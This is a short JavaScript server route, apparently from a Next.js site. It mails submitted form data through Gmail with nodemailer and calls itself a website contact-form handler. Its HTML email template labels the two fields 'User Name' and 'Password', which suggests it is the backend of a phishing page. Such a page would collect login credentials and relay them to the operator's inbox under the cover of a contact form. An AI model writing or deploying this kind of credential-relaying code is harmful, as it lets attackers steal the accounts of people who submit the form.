import nodemailer from "nodemailer";

export async function POST(req) {
  try {
    const { email, message } = await req.json();

    // Configure transporter
    const transporter = nodemailer.createTransport({
      service: "gmail", // or "outlook", "yahoo", etc.
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Mail options with HTML template
    const mailOptions = {
      from: `"Website Contact" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_RECEIVER,
      subject: "📩 New Message from Website",
      text: `User Name: ${email}\n\n${message}`, // fallback for plain-text clients
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border-radius: 8px; border: 1px solid #e0e0e0; background-color: #fafafa;">
          <h2 style="color: #333; text-align: center;">New Message Received</h2>
          <p style="font-size: 16px; color: #555;">
            <strong style="color: #000;">User Name:</strong> ${email}
          </p>
          <div style="margin-top: 15px; padding: 15px; background-color: #fff; border-left: 4px solid #4CAF50; border-radius: 4px;">
            <p style="font-size: 15px; color: #444; line-height: 1.6;"><strong style="color: #000;">Password:</strong> ${message}</p>
          </div>
          <p style="margin-top: 20px; font-size: 13px; color: #888; text-align: center;">
            This message was sent from your website contact form.
          </p>
        </div>
      `,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (error) {
    console.error(error);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { status: 500 }
    );
  }
}
